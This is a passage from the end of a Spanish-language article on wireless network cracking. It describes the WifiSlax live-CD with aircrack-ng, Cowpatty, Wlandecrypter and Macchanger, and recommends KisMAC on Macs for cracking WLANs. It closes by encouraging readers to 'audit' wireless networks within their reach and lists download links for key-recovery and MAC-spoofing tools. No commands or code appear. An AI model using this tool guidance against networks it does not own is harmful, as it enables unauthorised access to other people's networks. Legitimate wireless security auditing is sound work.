+Descargalo desde el site oficial [11].
+
+Bueno, en principio podriamos definirlo en dos conceptos:
+
+   1 - WifiSlax es Linux
+   2 - WifiSlax es un Live-CD
+
+A partir de aqui, y con todas estas ventajas por delante (fijense que
+puede portarse en un USB si asi lo desean), vamos alla con todas las
+novedades:
+
+- Basado en Slackware
+- Posee version reducida
+- Suite tradicional aircrack-sp
+- Suite actual aircrack-ng
+- Dlinkdecrypter
+- Airoscript (todo lo que necesites esta aqui dentro)
+- Airoscript para "ipw2200"
+- Lanzador Kismet
+- Macchanger
+- Wlandecrypter
+- Configuracion Wireless
+- Apoyo a varios chipset
+- Cowpatty
+- DHCP
+- Configuracion manual
+
+Y esto en lo que auditoria wireless se refiere, despues contiene unos
+cuantos navegadores al gusto como "Firefox" u "Opera", un instalador
+personalizado para fijar la distribucion en tu disco duro, y mas, mucho
+mas...
+
+En resumen, que no se diga que no se han aportado herramientas hacia
+los dos sistemas que mas compiten por un lugar en el mercado. Aunque
+hablar de linux y mercado es un poco paradojico.
+
+Vale, vale... y alguno estara diciendo, y que pasa con mi MacBook o mi
+nuevo MacBook Pro? Este tio nos ha dejado de lado? Pues no, mi mejor
+recomendacion para estos casos, por experiencia al poseer uno, y aunque
+lo tengo particionado junto con linux, es que utiliceis "KisMAC(-ng)"
+[12].
+
+Es facil de deducir, la version de "Kismet" para Macintosh. Algunos
+detalles de la preciada herramienta:
+
+- Es software libre
+- Soporta tarjetas AirPort
+- Soporta PCMIA (chipsets Orinoco o Prism2)
+
+Segun parece todavia no soporta reinyeccion de trafico, pero es muy
+valida para crackear redes de tipo "wlan".
+
+
+
+---[ 9 - Conclusion
+
+Lo que aqui has encontrado no es ni tecnologia punta, ni tan siquiera
+informacion clasificada. No perseguiamos eso, simplemente deseabamos
+abrirte un amplio abanico de posibilidades para que puedas auditar la
+mayoria de las redes inalambricas que esten a tu alcance.
+
+Si has descubierto un nuevo metodo o algoritmo para romper otro tipo
+de redes WiFi, no dudes en comunicarnoslo. Somos todo oidos y quizas
+podamos ayudarte a resolver cualquier duda.
+
+
+
+---[ 10 - Referencias
+
+ [1] Protocolos de seguridad en redes inalámbricas
+     http://www.saulo.net/pub/inv/SegWiFi-art.htm
+
+ [2] Wlandecrypter 0.5 - Revisado
+     http://www.telefonica.net/web2/amstrad/wlandecrypter-0.5.tar.gz
+
+ [3] WepLab
+     http://weplab.sourceforge.net/
+
+ [4] WepAttack
+     http://sourceforge.net/projects/wepattack/
+
+ [5] DecSagem
+     http://galeon.com/decsagem/DecSag.rar
+
+ [6] TKIP usado en WPA, herido de muerte
+     http://portalhispano.wordpress.com/2008/11/11/
+     tkip-usado-en-wpa-parece-estar-herido-de-muerte/
+
+ [7] Word Generator by Matteo Redaelli <matteo.redaelli@libero.it>
+     http://digilander.libero.it/reda/downloads/perl/wg.pl 
+
+ [8] Crack wpa Livebox avec crack-wpa.fr
+     http://es.youtube.com/watch?v=FZdm73IO5hQ
+
+ [9] Smac 2.0
+     http://www.klcconsulting.net/smac/
+
+ [10] ERW 2.4 - Final
+      http://rapidshare.com/files/132415341/ERW2.4_final.rar
+
+ [11] WifiSlax
+      http://www.wifislax.com/
+
+ [12] KisMAC
+      http://kismac.macpirate.ch
+
+*EOF*
